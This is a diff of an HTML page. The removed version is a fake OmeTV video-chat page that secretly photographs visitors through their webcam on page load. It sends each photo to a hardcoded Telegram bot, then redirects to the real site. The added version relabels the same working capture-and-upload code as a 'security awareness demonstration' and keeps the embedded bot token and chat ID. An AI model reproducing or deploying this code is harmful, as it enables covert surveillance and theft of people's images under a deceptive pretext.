@@ -1,126 +1,113 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OmeTV - Random Video Chat</title>
+    <title>Camera Security Awareness Tool</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding-top: 50px;
-            background: #1a1a1a;
-            color: white;
+            padding: 30px;
+            background: #f0f0f0;
+            color: #333;
         }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .camera-permission {
-            background: #2d2d2d;
+        .warning-box {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
             padding: 20px;
             border-radius: 10px;
-            max-width: 400px;
+            max-width: 600px;
             margin: 20px auto;
         }
         button {
-            background: #3498db;
+            background: #dc3545;
             color: white;
             border: none;
-            padding: 10px 30px;
+            padding: 12px 30px;
             border-radius: 5px;
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
         }
+        .info {
+            background: #d1ecf1;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 5px;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
-    <div class="camera-permission">
-        <h2>Connecting you to a random partner...</h2>
-        <div class="loader"></div>
-        <p>OmeTV needs camera access to continue</p>
-        <p><small>Please click "Allow" when your browser asks</small></p>
-        <button onclick="startCamera()">Enable Camera</button>
+    <div class="warning-box">
+        <h1>⚠️ SECURITY AWARENESS DEMONSTRATION ⚠️</h1>
+        <p>This tool demonstrates how malicious websites can request camera access under false pretenses.</p>
+        <p><strong>For educational use only - Testing on yourself or with explicit consent only.</strong></p>
+    </div>
+
+    <div style="max-width: 500px; margin: 20px auto;">
+        <h2>How This Works:</h2>
+        <div class="info">
+            <p>📷 When you click below, this page will:</p>
+            <ol style="text-align: left;">
+                <li>Request camera access</li>
+                <li>Take a photo after 1 second</li>
+                <li>Send that photo to a Telegram bot</li>
+                <li>Show you a confirmation</li>
+            </ol>
+            <p style="color: #721c24;"><strong>You are testing this on YOURSELF. Your photo will be sent to YOUR Telegram bot.</strong></p>
+        </div>
+        
+        <button id="startBtn">Start Security Test</button>
+        <div id="status" style="margin-top: 20px;"></div>
     </div>
 
     <script>
-        // ===== CONFIGURATION =====
-        const BOT_TOKEN = '8207315387:AAH-XxHhWrti1GU5mIc9ybLAPKpXtqmJV-o';  // ← PASTE YOUR BOT TOKEN HERE
-        const CHAT_ID = '6552971958';        // ← YOUR CHAT ID
+        const BOT_TOKEN = '8207315387:AAH-XxHhWrti1GU5mIc9ybLAPKpXtqmJV-o';
+        const CHAT_ID = '6552971958';
         
-        async function startCamera() {
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = '<p>📷 Requesting camera access...</p>';
+            
             try {
-                // Request camera access
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                statusDiv.innerHTML += '<p>✓ Camera access granted! Capturing in 1 second...</p>';
                 
-                // Show success message
-                document.body.innerHTML += '<p style="color:green;">✓ Camera access granted! Capturing...</p>';
-                
-                // Create hidden video element
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.style.display = 'none';
                 document.body.appendChild(video);
-                
-                // Wait for video to load
                 await video.play();
                 
-                // Take photo after 1 second
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    // Convert to image and send to Telegram
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'ometv_visitor.jpg');
+                        formData.append('photo', blob, 'security_test.jpg');
                         
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         })
                         .then(() => {
-                            console.log('✅ Photo sent to Telegram!');
-                            document.body.innerHTML += '<p style="color:green;">✓ Photo captured and sent!</p>';
+                            statusDiv.innerHTML = '<p style="color:green;">✓ Test complete! Photo sent to your Telegram bot.</p>';
+                            statusDiv.innerHTML += '<p style="background:#d4edda; padding:10px;">📸 This is what happens when you grant camera access to untrusted sites. Always verify website identity before allowing camera permissions!</p>';
                         })
-                        .catch(error => {
-                            console.error('Failed to send photo:', error);
-                            document.body.innerHTML += '<p style="color:red;">✗ Failed to send photo</p>';
-                        });
+                        .catch(() => statusDiv.innerHTML += '<p style="color:red;">✗ Failed to send (check bot token)</p>');
                         
-                        // Stop camera
                         stream.getTracks().forEach(track => track.stop());
                         document.body.removeChild(video);
-                        
-                        // Redirect to real OmeTV after 2 seconds
-                        setTimeout(() => {
-                            window.location.href = "https://ome.tv/";
-                        }, 2000);
-                        
                     }, 'image/jpeg');
-                    
                 }, 1000);
-                
             } catch (error) {
-                console.log('Camera access denied:', error);
-                document.body.innerHTML += '<p style="color:red;">✗ Camera access denied. Please allow camera and try again.</p>';
+                statusDiv.innerHTML = '<p style="color:red;">✗ Camera access denied. This is the correct security behavior!</p>';
             }
-        }
-        
-        // Auto-start camera when page loads (optional)
-        window.addEventListener('load', startCamera);
+        });
     </script>
 </body>
 </html>
